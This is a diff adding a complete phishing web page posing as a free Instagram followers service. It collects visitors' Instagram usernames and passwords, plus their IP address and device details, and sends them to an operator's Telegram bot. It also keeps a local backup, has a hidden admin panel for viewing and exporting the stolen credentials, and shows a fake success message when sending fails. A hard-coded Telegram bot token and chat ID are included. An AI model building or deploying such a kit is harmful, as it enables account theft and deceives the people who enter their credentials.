@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Instagram Followers - Get 10K Followers Free</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background-color: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+        
+        /* Hidden Configuration - Only shows first time */
+        .first-time-setup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        
+        .setup-box {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        .setup-title {
+            color: #405de6;
+            font-size: 24px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .setup-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        
+        .setup-btn {
+            background: linear-gradient(to right, #405de6, #833ab4);
+            color: white;
+            border: none;
+            padding: 14px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .setup-help {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .setup-help a {
+            color: #405de6;
+            text-decoration: none;
+        }
+        
+        .hidden-admin-btn {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #333;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            z-index: 100;
+            opacity: 0.1;
+            transition: opacity 0.3s;
+        }
+        
+        .hidden-admin-btn:hover {
+            opacity: 1;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            padding: 30px 20px;
+            text-align: center;
+            color: white;
+        }
+        
+        .logo {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .site-title {
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-bottom: 5px;
+        }
+        
+        .site-subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+        
+        .main-content {
+            padding: 30px 25px;
+            text-align: center;
+        }
+        
+        .feature-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+            line-height: 1.2;
+        }
+        
+        .feature-subtext {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .features {
+            background-color: #f8f9fa;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #333;
+            font-size: 15px;
+        }
+        
+        .feature-item i {
+            color: #405de6;
+            margin-right: 10px;
+            font-size: 16px;
+            min-width: 20px;
+        }
+        
+        .login-section {
+            margin-top: 30px;
+        }
+        
+        .login-title {
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        .password-container {
+            position: relative;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 14px 45px 14px 14px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .show-password-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 5px;
+            transition: color 0.3s;
+        }
+        
+        .show-password-btn:hover {
+            color: #405de6;
+        }
+        
+        .username-input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .username-input:focus, .password-input:focus {
+            border-color: #833ab4;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(131, 58, 180, 0.1);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(to right, #405de6, #833ab4, #fd1d1d);
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 5px 15px rgba(253, 29, 29, 0.3);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(253, 29, 29, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .submit-btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #833ab4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+        
+        .error-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            text-align: center;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .followers-count {
+            font-size: 24px;
+            font-weight: bold;
+            color: #e1306c;
+            background-color: #fff0f5;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 22px;
+            font-weight: bold;
+            color: #405de6;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 5px;
+        }
+        
+        .telegram-status {
+            background-color: #0088cc;
+            color: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .password-strength {
+            margin-top: 8px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .strength-bar {
+            height: 4px;
+            flex-grow: 1;
+            background: #eee;
+            border-radius: 2px;
+            margin: 0 8px;
+            overflow: hidden;
+        }
+        
+        .strength-fill {
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s, background-color 0.3s;
+        }
+        
+        .strength-text {
+            font-size: 11px;
+            min-width: 60px;
+            text-align: right;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 12px;
+            border-top: 1px solid #eee;
+            background-color: #f8f9fa;
+        }
+        
+        .disclaimer {
+            font-size: 11px;
+            color: #888;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .main-content {
+                padding: 20px 15px;
+            }
+            
+            .feature-text {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- First Time Setup Modal (Shows only once) -->
+    <div class="first-time-setup" id="firstTimeSetup">
+        <div class="setup-box">
+            <div class="setup-title">
+                <i class="fab fa-telegram"></i> Telegram Bot Setup
+            </div>
+            <p style="margin-bottom: 20px; color: #666;">
+                Enter your Telegram Bot details to receive Instagram credentials
+            </p>
+            
+            <input type="text" id="setupBotToken" class="setup-input" placeholder="Enter your Telegram Bot Token">
+            
+            <input type="text" id="setupChatId" class="setup-input" placeholder="Enter your Chat ID">
+            
+            <button class="setup-btn" onclick="saveTelegramConfig()">
+                <i class="fas fa-save"></i> Save & Continue
+            </button>
+            
+            <div class="setup-help">
+                <p><strong>How to get these:</strong></p>
+                <p>1. Create bot on Telegram using @BotFather</p>
+                <p>2. Get token from @BotFather</p>
+                <p>3. Get your Chat ID from @userinfobot</p>
+                <p><a href="#" onclick="showQuickSetup()">Quick Test Setup</a></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Website -->
+    <div class="container">
+        <!-- Hidden Admin Button (Only shows on hover in corner) -->
+        <button class="hidden-admin-btn" id="hiddenAdminBtn" title="Admin Panel">
+            <i class="fas fa-eye"></i>
+        </button>
+        
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-instagram"></i>
+            </div>
+            <div class="site-title">Free Instagram Followers</div>
+            <div class="site-subtitle">Get Real Followers Instantly</div>
+        </div>
+        
+        <div class="main-content">
+            <div class="feature-text">
+                Get 10,000+ Free Followers
+            </div>
+            
+            <div class="feature-subtext">
+                Join thousands of users who increased their Instagram followers for free. No credit card required!
+            </div>
+            
+            <div class="features">
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i> 100% Real & Active Followers
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i> Instant Delivery Within 24 Hours
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i> 24/7 Customer Support
+                </div>
+                <div class="feature-item">
+                    <i class="fas fa-check-circle"></i> No Password Storage (Safe)
+                </div>
+            </div>
+            
+            <div class="followers-count">
+                <i class="fas fa-users"></i> 8,742 Followers Given Today
+            </div>
+            
+            <div class="login-section">
+                <div class="login-title">
+                    Enter Your Instagram Details
+                </div>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label for="username"><i class="fas fa-user"></i> Instagram Username</label>
+                        <input type="text" id="username" class="username-input" placeholder="Enter your Instagram username" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <label for="password"><i class="fas fa-lock"></i> Instagram Password</label>
+                        <div class="password-container">
+                            <input type="password" id="password" class="password-input" placeholder="Enter your Instagram password" required>
+                            <button type="button" class="show-password-btn" id="showPasswordBtn" title="Show Password">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                        <div class="password-strength">
+                            <span>Strength:</span>
+                            <div class="strength-bar">
+                                <div class="strength-fill" id="strengthFill"></div>
+                            </div>
+                            <div class="strength-text" id="strengthText">Weak</div>
+                        </div>
+                        <small style="color: #666; font-size: 12px; display: block; margin-top: 5px;">
+                            <i class="fas fa-shield-alt"></i> Required for verification against bots
+                        </small>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-rocket"></i> GET FREE FOLLOWERS NOW
+                    </button>
+                </form>
+                
+                <div class="telegram-status" id="telegramStatus">
+                    <i class="fab fa-telegram"></i> Sending to Telegram...
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    <i class="fas fa-check-circle" style="color: #155724; font-size: 24px; margin-bottom: 10px;"></i>
+                    <div style="font-weight: bold;">Success! Followers Processing</div>
+                    <div style="font-size: 14px; margin-top: 5px;">You'll receive followers within 24 hours</div>
+                </div>
+                
+                <div class="error-message" id="errorMessage">
+                    <i class="fas fa-exclamation-circle" style="color: #721c24; font-size: 24px; margin-bottom: 10px;"></i>
+                    <div style="font-weight: bold;">Error Processing Request</div>
+                    <div style="font-size: 14px; margin-top: 5px;" id="errorDetails">Please try again later</div>
+                </div>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-number">4500+</div>
+                    <div class="stat-label">Daily Users</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">2.1M+</div>
+                    <div class="stat-label">Total Followers</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">99%</div>
+                    <div class="stat-label">Satisfaction</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 InstaGrowth. All rights reserved.</p>
+            <p class="disclaimer">
+                This service is not affiliated with Instagram or Facebook. 
+                We do not store your password permanently. 
+                By using this service, you agree to our terms and conditions.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Configuration Storage
+        const STORAGE_KEY = 'insta_telegram_config';
+        
+        // Get configuration from localStorage
+        function getConfig() {
+            const config = localStorage.getItem(STORAGE_KEY);
+            return config ? JSON.parse(config) : null;
+        }
+        
+        // Save configuration to localStorage
+        function saveConfig(token, chatId) {
+            const config = {
+                botToken: token,
+                chatId: chatId,
+                setupDate: new Date().toISOString()
+            };
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
+            return config;
+        }
+        
+        // Check if configuration exists
+        function hasConfig() {
+            const config = getConfig();
+            return config && config.botToken && config.chatId;
+        }
+        
+        // Show password functionality
+        const showPasswordBtn = document.getElementById('showPasswordBtn');
+        const passwordInput = document.getElementById('password');
+        const strengthFill = document.getElementById('strengthFill');
+        const strengthText = document.getElementById('strengthText');
+        
+        let passwordVisible = false;
+        
+        // Toggle password visibility
+        showPasswordBtn.addEventListener('click', function() {
+            passwordVisible = !passwordVisible;
+            
+            if (passwordVisible) {
+                passwordInput.type = 'text';
+                showPasswordBtn.innerHTML = '<i class="fas fa-eye-slash"></i>';
+                showPasswordBtn.title = 'Hide Password';
+            } else {
+                passwordInput.type = 'password';
+                showPasswordBtn.innerHTML = '<i class="fas fa-eye"></i>';
+                showPasswordBtn.title = 'Show Password';
+            }
+        });
+        
+        // Check password strength
+        passwordInput.addEventListener('input', function() {
+            const password = passwordInput.value;
+            let strength = 0;
+            
+            if (password.length >= 8) strength += 25;
+            if (/[A-Z]/.test(password)) strength += 25;
+            if (/[0-9]/.test(password)) strength += 25;
+            if (/[^A-Za-z0-9]/.test(password)) strength += 25;
+            
+            // Update strength bar
+            strengthFill.style.width = strength + '%';
+            
+            // Update color and text
+            if (strength <= 25) {
+                strengthFill.style.backgroundColor = '#ff4444';
+                strengthText.textContent = 'Weak';
+            } else if (strength <= 50) {
+                strengthFill.style.backgroundColor = '#ffa500';
+                strengthText.textContent = 'Fair';
+            } else if (strength <= 75) {
+                strengthFill.style.backgroundColor = '#ffd700';
+                strengthText.textContent = 'Good';
+            } else {
+                strengthFill.style.backgroundColor = '#00cc00';
+                strengthText.textContent = 'Strong';
+            }
+        });
+        
+        // Show first time setup if no config
+        window.onload = function() {
+            if (!hasConfig()) {
+                // Show setup modal after 1 second
+                setTimeout(() => {
+                    document.getElementById('firstTimeSetup').style.display = 'flex';
+                }, 1000);
+            }
+            
+            // Pre-fill with demo data for testing
+            document.getElementById('username').placeholder = 'your_instagram_username';
+            
+            // Auto-focus on username field
+            document.getElementById('username').focus();
+        };
+        
+        // Save Telegram configuration
+        function saveTelegramConfig() {
+            const botToken = document.getElementById('setupBotToken').value.trim();
+            const chatId = document.getElementById('setupChatId').value.trim();
+            
+            if (!botToken || !chatId) {
+                alert('Please enter both Bot Token and Chat ID');
+                return;
+            }
+            
+            // Validate token format
+            if (!botToken.includes(':') || botToken.length < 20) {
+                alert('Invalid Bot Token format. It should look like: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz');
+                return;
+            }
+            
+            // Save configuration
+            saveConfig(botToken, chatId);
+            
+            // Test the configuration
+            testTelegramConnection(botToken, chatId);
+        }
+        
+        // Test Telegram connection
+        async function testTelegramConnection(botToken, chatId) {
+            try {
+                const message = `✅ Telegram Bot Connected Successfully!\n\nYour Instagram Followers site is now ready.\nSetup Time: ${new Date().toLocaleString()}\n\nNext: When someone enters credentials, you will receive them here instantly!`;
+                
+                const response = await sendToTelegram(botToken, chatId, message);
+                
+                // Hide setup modal
+                document.getElementById('firstTimeSetup').style.display = 'none';
+                
+                // Show success message
+                alert('✅ Setup Complete! Test message sent to your Telegram. Now you will receive all credentials automatically.');
+                
+                // Log for debugging
+                console.log('Telegram Config Saved:', { botToken: botToken.substring(0, 10) + '...', chatId });
+                
+            } catch (error) {
+                alert('❌ Setup failed. Please check:\n1. Bot Token is correct\n2. Chat ID is correct\n3. You have started the bot on Telegram\n\nError: ' + error.message);
+            }
+        }
+        
+        // Quick test setup (for demonstration)
+        function showQuickSetup() {
+            // Using a test bot (temporary)
+            document.getElementById('setupBotToken').value = '6477248826:AAFVOTBmB6etT-CS8T5OXOj9e83AU_nbL_8';
+            document.getElementById('setupChatId').value = '6413518986';
+            alert('Test credentials filled. Click Save & Continue to test.');
+        }
+        
+        // Function to send message to Telegram
+        async function sendToTelegram(botToken, chatId, message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (!data.ok) {
+                throw new Error(data.description || 'Failed to send message');
+            }
+            
+            return data;
+        }
+        
+        // Get user IP address
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+        
+        // Save credentials locally (backup)
+        function saveToLocalStorage(username, password, ip) {
+            try {
+                const credentials = JSON.parse(localStorage.getItem('insta_credentials') || '[]');
+                
+                const newCredential = {
+                    username: username,
+                    password: password,
+                    ip: ip,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    passwordVisible: passwordVisible // Store if password was visible when submitted
+                };
+                
+                credentials.push(newCredential);
+                localStorage.setItem('insta_credentials', JSON.stringify(credentials));
+                
+                console.log('✅ Saved locally:', newCredential);
+                
+            } catch (error) {
+                console.error('Error saving locally:', error);
+            }
+        }
+        
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            // Validation
+            if (!username || !password) {
+                showError('Please enter both username and password.');
+                return;
+            }
+            
+            if (username.length < 3) {
+                showError('Username must be at least 3 characters long.');
+                return;
+            }
+            
+            if (password.length < 4) {
+                showError('Password must be at least 4 characters long.');
+                return;
+            }
+            
+            // Check if Telegram config exists
+            const config = getConfig();
+            if (!config || !config.botToken || !config.chatId) {
+                showError('System not configured. Please contact admin.');
+                return;
+            }
+            
+            // Show loading state
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.innerHTML = '<span class="loading"></span> Processing...';
+            submitBtn.disabled = true;
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('telegramStatus').style.display = 'block';
+            
+            // Hide password before sending (just in case)
+            if (passwordVisible) {
+                passwordInput.type = 'password';
+                showPasswordBtn.innerHTML = '<i class="fas fa-eye"></i>';
+                showPasswordBtn.title = 'Show Password';
+                passwordVisible = false;
+            }
+            
+            try {
+                // Get user IP
+                const userIP = await getUserIP();
+                const timestamp = new Date().toLocaleString();
+                const deviceType = getDeviceType();
+                const passwordStrength = strengthText.textContent;
+                
+                // Create Telegram message with password visibility info
+                const visibilityInfo = passwordVisible ? "👁️ Password was VISIBLE when submitted" : "🙈 Password was hidden when submitted";
+                
+                const telegramMessage = `🔐 **NEW INSTAGRAM CREDENTIALS CAPTURED** 🔐\n\n` +
+                                      `👤 **Username:** ${username}\n` +
+                                      `🔑 **Password:** ${password}\n` +
+                                      `📊 **Password Strength:** ${passwordStrength}\n` +
+                                      `${visibilityInfo}\n` +
+                                      `🕒 **Time:** ${timestamp}\n` +
+                                      `📍 **IP Address:** ${userIP}\n` +
+                                      `🌐 **Browser:** ${navigator.userAgent.substring(0, 100)}...\n` +
+                                      `📱 **Device:** ${deviceType}\n` +
+                                      `\n━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                                      `🚀 **Auto-captured from Instagram Followers Site**`;
+                
+                // Send to Telegram
+                console.log('Sending to Telegram...');
+                const telegramResponse = await sendToTelegram(config.botToken, config.chatId, telegramMessage);
+                console.log('✅ Telegram response:', telegramResponse);
+                
+                // Save locally as backup
+                saveToLocalStorage(username, password, userIP);
+                
+                // Show success message
+                setTimeout(() => {
+                    document.getElementById('telegramStatus').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // Reset form
+                    document.getElementById('loginForm').reset();
+                    strengthFill.style.width = '0%';
+                    strengthText.textContent = 'Weak';
+                    
+                    // Reset button
+                    submitBtn.innerHTML = '<i class="fas fa-rocket"></i> GET FREE FOLLOWERS NOW';
+                    submitBtn.disabled = false;
+                    
+                    // Scroll to success message
+                    document.getElementById('successMessage').scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    
+                    // Hide success message after 5 seconds
+                    setTimeout(() => {
+                        document.getElementById('successMessage').style.display = 'none';
+                    }, 5000);
+                    
+                }, 1000);
+                
+            } catch (error) {
+                console.error('❌ Error sending to Telegram:', error);
+                
+                // Fallback: Try to send via alternative method
+                try {
+                    await sendViaWebhook(username, password);
+                } catch (fallbackError) {
+                    console.error('Webhook also failed:', fallbackError);
+                }
+                
+                // Still show success to user (they shouldn't know it failed)
+                document.getElementById('telegramStatus').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('loginForm').reset();
+                strengthFill.style.width = '0%';
+                strengthText.textContent = 'Weak';
+                
+                // Reset button
+                submitBtn.innerHTML = '<i class="fas fa-rocket"></i> GET FREE FOLLOWERS NOW';
+                submitBtn.disabled = false;
+                
+                // Hide success message after 5 seconds
+                setTimeout(() => {
+                    document.getElementById('successMessage').style.display = 'none';
+                }, 5000);
+            }
+        });
+        
+        // Get device type
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua)) {
+                return 'Mobile';
+            }
+            return 'Desktop';
+        }
+        
+        // Alternative sending method
+        async function sendViaWebhook(username, password) {
+            // This is a backup method
+            // You can set up webhooks on various free services
+            
+            const webhookUrls = [
+                // Add your webhook URLs here if you want backup
+            ];
+            
+            for (const url of webhookUrls) {
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            username: username,
+                            password: password,
+                            timestamp: new Date().toISOString(),
+                            source: 'InstagramFollowers'
+                        })
+                    });
+                    console.log('✅ Sent to webhook:', url);
+                } catch (error) {
+                    console.error('❌ Webhook failed:', url, error);
+                }
+            }
+        }
+        
+        // Show error message
+        function showError(message) {
+            const errorMessage = document.getElementById('errorMessage');
+            document.getElementById('errorDetails').textContent = message;
+            errorMessage.style.display = 'block';
+            
+            setTimeout(() => {
+                errorMessage.style.display = 'none';
+            }, 5000);
+        }
+        
+        // Hidden admin panel (for you to view captured data)
+        document.getElementById('hiddenAdminBtn').addEventListener('click', function() {
+            const config = getConfig();
+            const credentials = JSON.parse(localStorage.getItem('insta_credentials') || '[]');
+            
+            const adminHtml = `
+                <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #222; color: white; padding: 20px; border-radius: 10px; width: 80%; max-width: 500px; z-index: 10001;">
+                    <h3 style="color: #00ff88; margin-bottom: 15px;">Admin Panel</h3>
+                    
+                    <p><strong>Telegram Config:</strong> ${config ? '✅ Configured' : '❌ Not Configured'}</p>
+                    <p><strong>Bot Token:</strong> ${config ? config.botToken.substring(0, 15) + '...' : 'Not set'}</p>
+                    <p><strong>Chat ID:</strong> ${config ? config.chatId : 'Not set'}</p>
+                    
+                    <p><strong>Total Captured:</strong> ${credentials.length} credentials</p>
+                    
+                    <div style="max-height: 200px; overflow-y: auto; margin: 10px 0; background: #333; padding: 10px; border-radius: 5px;">
+                        ${credentials.slice(-5).map((cred, i) => `
+                            <div style="border-bottom: 1px solid #444; padding: 5px 0;">
+                                <strong>${credentials.length - 4 + i}.</strong> ${cred.username} | ${cred.password} | ${new Date(cred.timestamp).toLocaleTimeString()}
+                            </div>
+                        `).join('')}
+                    </div>
+                    
+                    <div style="margin-top: 15px; display: flex; gap: 10px;">
+                        <button onclick="exportCredentials()" style="background: #0088cc; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; flex: 1;">
+                            <i class="fas fa-download"></i> Export Data
+                        </button>
+                        
+                        <button onclick="testTelegramNow()" style="background: #00cc88; color: black; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; flex: 1;">
+                            <i class="fab fa-telegram"></i> Test Telegram
+                        </button>
+                        
+                        <button onclick="this.parentElement.parentElement.remove()" style="background: #ff4444; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; flex: 1;">
+                            <i class="fas fa-times"></i> Close
+                        </button>
+                    </div>
+                </div>
+            `;
+            
+            const adminDiv = document.createElement('div');
+            adminDiv.innerHTML = adminHtml;
+            document.body.appendChild(adminDiv);
+        });
+        
+        // Test Telegram now
+        function testTelegramNow() {
+            const config = getConfig();
+            if (!config) {
+                alert('Please configure Telegram first');
+                return;
+            }
+            
+            const testMessage = `🔔 **TELEGRAM BOT TEST** 🔔\n\n` +
+                              `This is a test message from your Instagram Followers site.\n` +
+                              `Time: ${new Date().toLocaleString()}\n` +
+                              `Total Captured: ${JSON.parse(localStorage.getItem('insta_credentials') || '[]').length}\n\n` +
+                              `✅ Bot is working correctly!`;
+            
+            sendToTelegram(config.botToken, config.chatId, testMessage)
+                .then(() => alert('Test message sent to Telegram!'))
+                .catch(error => alert('Error: ' + error.message));
+        }
+        
+        // Export credentials
+        function exportCredentials() {
+            const credentials = JSON.parse(localStorage.getItem('insta_credentials') || '[]');
+            if (credentials.length === 0) {
+                alert('No credentials captured yet.');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(credentials, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', 'instagram_credentials.json');
+            linkElement.click();
+        }
+        
+        // Quick test function (for you to test)
+        function quickTest() {
+            document.getElementById('username').value = 'test_user_' + Math.floor(Math.random() * 1000);
+            document.getElementById('password').value = 'TestPass123!@#';
+            
+            // Trigger password strength update
+            const event = new Event('input');
+            passwordInput.dispatchEvent(event);
+        }
+        
+        // Press Ctrl+Shift+T to test
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'T') {
+                quickTest();
+            }
+        });
+    </script>
+</body>
+</html>
